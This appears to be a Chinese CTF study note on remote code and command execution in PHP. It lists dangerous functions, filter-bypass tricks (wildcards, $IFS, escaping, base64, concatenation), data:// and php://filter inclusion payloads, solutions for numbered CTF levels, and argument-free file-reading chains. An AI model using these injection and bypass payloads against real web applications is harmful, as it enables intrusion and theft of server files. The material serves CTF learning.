
---
*RCE代码&命令执行&过滤绕过&异或无字符&无回显方案&黑白盒挖掘*

➢ RCE-利用&绕过&异或&回显

➢ 白盒-CTF-RCE代码命令执行

➢ 黑盒-运行-RCE代码命令执行

-RCE代码执行：引用脚本代码解析执行

-RCE命令执行：脚本调用操作系统命令

# 漏洞函数：

### 1.**PHP**：

PHP==代码执行==函数：

```
	eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等
```

PHP==命令执行==函数：

```
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
```

### 2.**Python**：

```
	eval exec subprocess os.system commands
```

### 3.**Java：

```
Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，

但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.

代码执行：

脚本——java，php，python

产生——Web源码、中间件平台、其他环境

检测——白盒 代码审计

检测——黑盒 漏扫工具、公开漏洞、手工看参数及功能点

防御——敏感函数禁用、变量过滤或固定、WAF产品

命令执行：

系统——Linux、Windows

产生——web源码、中间件平台、其他环境

检测——白盒 代码审计

检测——黑盒 漏扫工具，公开漏洞，手工看参数及功能点

防御——敏感函数禁用、变量过滤或固定、WAF产品
```

#RCE-利用&绕过&异或&回显

### 1、伪协议玩法

配合文件包含伪协议（代码执行）
```
include $_GET[a]?>&a=data://text/plain,<?php system('ver');?>

include $_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=index.php

```

### （1）关键字过滤：

#### 1、过滤flag关键字

通配符

```
flag=fl*

cat fl*

cat ?la*

```
转义符号
```
ca\t /fl\ag

cat fl''ag
```

使用空变量$*和$@，$x,${x}绕过

```
ca$*t fl$*ag

ca$@t fl$@ag

ca$5t f$5lag

ca${2}t f${2}lag
```

拼接法

```
	a=fl;b=ag;cat$IFS$a$b

```

反引号绕过:

```
	cat `ls`
```
编码绕过:

```
	echo 'flag' | base64
	
	cat `echo ZmxhZwo= | base64 -d`
```

组合绝活

```
	touch "ag"
	
	touch "fl\\"
	
	touch "t \\"
	
	touch "ca\\"
	
	ls -t >shell
	
	sh shell
	
	# \指的是换行
	# ls -t是将文本按时间排序输出
	# ls -t >shell 将输出输入到shell文件中
	# sh将文本中的文字读取出来执行
```
环境变量

```
取$PATH环境变量中第五个字符开始，取一个
echo f${PATH:5:1}

```

7、异或无符号（过滤0-9a-zA-Z）

```
	异或：rce-xor.php & rce-xor.py
	
	或：rce-xor-or.php & rce-xor-or.py

```
（2）过滤函数关键字

1、内敛执行绕过（system）

```
	echo `ls`;

	echo $(ls);
	
	?><?=`ls`;
	
	?><?=$(ls);
```

2、过滤执行命令（如cat tac等）

```
	more:一页一页的显示档案内容
	
	less:与 more 类似
	
	head:查看头几行
	
	tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
	
	tail:查看尾几行
	
	nl：显示的时候，顺便输出行号
	
	od:以二进制的方式读取档案内容
	
	vi:一种编辑器，这个也可以查看
	
	vim:一种编辑器，这个也可以查看
	
	sort:可以查看
	
	uniq:可以查看
	
	file -f:报错出具体内容
	
	sh /flag 2>%261 //报错出文件内容
	
	curl file:///root/f/flag
	
	strings flag
	
	uniq -c flag
	
	bash -v flag
	
	rev flag

	dd if=/flag bs=1M
```

3、过滤空格

```
	%09（url传递）(cat%09flag.php)

	cat${IFS}flag
	$IFS$9

	a=fl;b=ag;cat$IFS$a$b

	{cat,flag}

	重定向字符 <,<>
	cat<flag
	cat<>flag

```

4、拼接绕过
```
; 指令拼接
|| 前面错误后面才执行
& 
&&
&要进行url编码
```

（3）无回显利用

```
	1、直接写个文件访问查看
	
	2、直接进行对外访问接受
```

命令连接符
```
;	分号
|	只执行后面那条命令
||	只执行前面那条命令
&	两条命令都会执行
&&	两条命令都会执行
```
# 白盒-CTF-RCE代码命令执行

29-通配符


```
	system('tac fla*.php');
```

30-取代函数&通配符&管道符

```
		`cp fla*.ph* 2.txt`;
		
		echo shell_exec('tac fla*.ph*');
```


31-参数逃逸

```
	eval($_GET[1]);&1=system('tac flag.php');
	
```
32~36-配合包含&伪协议

```
由于过滤了分号，所以用?> 代替 ;

	include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
	
	include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```
37~39-包含RCE&伪协议&通配符

```
	data://text/plain,<?php system('tac fla*');?>
	
	php://input post:<?php system('tac flag.php');?>

```
#黑盒-运行-RCE代码命令执行

代码在线运行平台测试

# 附录、无法连接时，指令
```
`查询内容`

a=print_r(glob("*"));
var_dump(glob("*"));

读取根目录
print_r(scandir("/"));
var_dump(scandir("/"));

`查看文件`
var_dump(file_get_contents('/flag'));
a=highlight_file("index.php");

find / -name flag*
```

# 无参数文件读取

localeconv()数组第一个值为点

读取数组第一项可以的函数有current()、pos() 、reset()
所以最终我们可以构造如下
```
print_r(scandir(current(localeconv())));

print_r(scandir(pos(localeconv())));

print_r(scandir(reset(localeconv())));

py

var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));

scandir() 读取目录返回数组
array_reverse()翻转数组
next() 当前数组
```

#[Shell脚本—/dev/null 2>&1详解](https://www.cnblogs.com/tinywan/p/6025468.html )